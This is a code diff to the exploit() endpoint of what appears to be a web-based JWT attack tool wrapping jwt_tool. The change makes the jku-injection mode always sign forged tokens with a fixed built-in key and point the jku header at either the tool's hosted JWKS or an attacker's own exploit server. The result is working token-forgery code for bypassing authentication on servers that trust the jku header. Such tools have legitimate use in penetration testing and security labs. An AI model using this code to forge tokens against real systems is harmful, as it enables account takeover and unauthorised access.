@@ -400,13 +400,17 @@ def exploit():
         with os.fdopen(fd, "w") as f:
             f.write(pubkey)
         args += ["-pk", tmp_key_path]
-    elif code == "s" and not jwks_url:
-        # No JWKS URL given: self-sign with EasyJWT's built-in default key
-        # instead of calling jwt_tool (which would generate its own random,
-        # unhosted keypair). This key's public half is always served at
-        # /jwks.json on every EasyJWT instance, local or live, so the
-        # resulting token is actually verifiable by a real target server
-        # without the user having to host anything themselves.
+    elif code == "s":
+        # Always self-sign with EasyJWT's built-in default key, rather than
+        # calling jwt_tool (which would generate its own random, unhosted
+        # keypair every time). The URL field only controls where the jku
+        # header points: EasyJWT's own hosted /jwks.json if left blank, or
+        # any URL you paste in, e.g. your own exploit server, if the
+        # target's network can't reach easyjwt.imegz.dev. Either way the
+        # signature comes from the same fixed key, so whichever JWKS body
+        # the target actually fetches, it only needs to contain THIS key's
+        # public half (visit /jwks.json yourself in a browser and copy it
+        # in, no need to generate a new key anywhere).
         parts = token.split(".")
         if len(parts) < 2:
             return jsonify({"error": "That does not look like a JWT"}), 400
@@ -419,8 +423,9 @@ def exploit():
             return jsonify({"error": "Token header/payload must be JSON objects"}), 400
 
         default_jwks_url = f"{SITE_URL}/jwks.json"
+        target_jku = jwks_url or default_jwks_url
         header["alg"] = "RS256"
-        header["jku"] = default_jwks_url
+        header["jku"] = target_jku
         header["kid"] = DEFAULT_JWKS_KID
         if "typ" not in header:
             header["typ"] = None  # don't let PyJWT silently add one, see /api/forge
@@ -430,16 +435,23 @@ def exploit():
         except Exception as exc:
             return jsonify({"error": f"Could not sign the token: {exc}"}), 400
 
-        output = (
-            "No JWKS URL given, so this was self-signed with EasyJWT's built-in default key. "
-            f"Its public half is always hosted at {default_jwks_url}, so a server that fetches "
-            "the jku header and trusts it will accept this token.\n"
-            "To use your own key instead, host your own JWKS and paste its URL above before running this.\n\n"
-            f"New JWT:\n\n{new_token}"
-        )
+        if jwks_url:
+            note = (
+                f"Signed with EasyJWT's built-in default key, jku set to the URL you gave: {target_jku}\n"
+                f"Make sure that URL actually serves a JWKS containing this exact key (visit "
+                f"{default_jwks_url} yourself and copy its \"keys\" entry into your JWKS body) "
+                "or the target won't be able to verify this signature."
+            )
+        else:
+            note = (
+                "No JWKS URL given, so jku points at EasyJWT's own hosted default key "
+                f"({default_jwks_url}). If the target server can't reach that domain, paste "
+                "your own URL above instead (e.g. a lab's exploit server) and host the same "
+                f"key there yourself, copied from {default_jwks_url}."
+            )
+
+        output = f"{note}\n\nNew JWT:\n\n{new_token}"
         return jsonify({"output": output})
-    elif code == "s":
-        args += ["-ju", jwks_url]
 
     try:
         output = run_jwt_tool(args)
